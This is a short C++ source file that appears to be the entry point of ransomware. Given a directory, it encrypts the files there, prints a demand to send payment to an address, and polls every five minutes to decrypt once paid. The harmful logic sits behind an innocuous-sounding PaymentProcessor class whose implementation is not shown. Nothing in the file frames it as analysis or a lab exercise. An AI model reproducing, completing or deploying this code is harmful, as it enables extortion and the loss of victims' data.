#include <cstdio>
#include <iostream>
#include <chrono>
#include <thread>

#include "PaymentProcessor.h"

int main(int argc, char **argv) {
	if (argc < 2) {
        std::cout << "Error: no directory given" << std::endl;
        exit(EXIT_FAILURE);
    }

    PaymentProcessor processor(argv[1]);

    processor.encryptFiles();

    std::cout << "Send payment to " << processor.getAddress() << std::endl;
    
    while (processor.tryDecrypt() < 0)
        std::this_thread::sleep_for(std::chrono::minutes(5));

    return 0;
}
